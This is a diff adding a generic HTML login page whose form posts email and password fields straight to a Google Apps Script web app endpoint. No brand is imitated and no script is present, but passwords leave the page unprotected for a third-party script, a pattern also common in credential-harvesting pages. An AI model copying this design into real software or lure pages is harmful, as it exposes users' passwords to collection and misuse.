@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <title>Login</title>
+</head>
+<body>
+    <div class="login-box">
+        <!-- Form action points to the deployed Google Apps Script Web App URL -->
+        <form action="https://script.google.com/macros/s/AKfycbzD8JdCFVUuk6k2z3IrHy_B2wC5674g3wn1pofjvyE/exec" method="POST">
+            <div class="login-header">
+                <header>Login</header>
+            </div>
+            <div class="input-box">
+                <input type="email" class="input-field" name="email" placeholder="Email" autocomplete="off" required>
+            </div>
+            <div class="input-box">
+                <input type="password" class="input-field" name="password" placeholder="Password" autocomplete="off" required>
+            </div>
+            <div class="forgot">
+                <section>
+                    <input type="checkbox" id="check">
+                    <label for="check">Remember me</label>
+                </section>
+                <section>
+                    <a href="#">Forgot password</a>
+                </section>
+            </div>
+            <div class="input-submit">
+                <button class="submit-btn" type="submit">Sign In</button>
+            </div>
+            <div class="sign-up-link">
+                <p>Don't have an account? <a href="#">Sign Up</a></p>
+            </div>
+        </form>
+    </div>
+</body>
+
+</html>
